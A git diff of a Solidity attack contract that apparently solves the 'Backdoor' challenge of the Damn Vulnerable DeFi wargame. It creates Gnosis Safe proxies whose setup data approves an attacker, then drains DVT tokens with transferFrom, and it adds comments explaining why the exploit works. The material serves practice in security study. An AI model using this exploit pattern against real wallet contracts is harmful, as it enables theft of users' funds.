@@ -12,14 +12,14 @@ import "../../../src/Contracts/DamnValuableToken.sol";
 // solution from: https://www.youtube.com/watch?v=Fm2tnSESexo
 
 contract AttackBackdoor {
-    address public owner;
+    address public attacker;
     address public factory;
     address public masterCopy;
     address public walletRegistry;
     address public token;
 
     constructor(
-        address _owner,
+        address _attacker,
         address _factory,
         address _masterCopy,
         address _walletRegistry,
@@ -27,7 +27,7 @@ contract AttackBackdoor {
         address[] memory users
     ) {
         // Setup vars
-        owner = _owner;
+        attacker = _attacker;
         factory = _factory;
         masterCopy = _masterCopy;
         walletRegistry = _walletRegistry;
@@ -63,13 +63,15 @@ contract AttackBackdoor {
             );
 
             // Deploy the proxy with all the exploit data in initGnosis
+            // the expoit works because it calls GnosisSafe.setup wich uses the abm setupData
+            // to approve the token to the attacker wallet allowing the transferFrom call after this
             GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(
                 masterCopy, initGnosis, 123, IProxyCreationCallback(walletRegistry)
             );
 
             // Proxy has approved this contract for transfer in the
-            // module setup so we should be able to transfer some ETH
-            DamnValuableToken(token).transferFrom(address(newProxy), owner, 10 ether);
+            // module setup so we should be able to transfer the DVT tokens
+            DamnValuableToken(token).transferFrom(address(newProxy), attacker, 10 ether);
         }
     }
 }
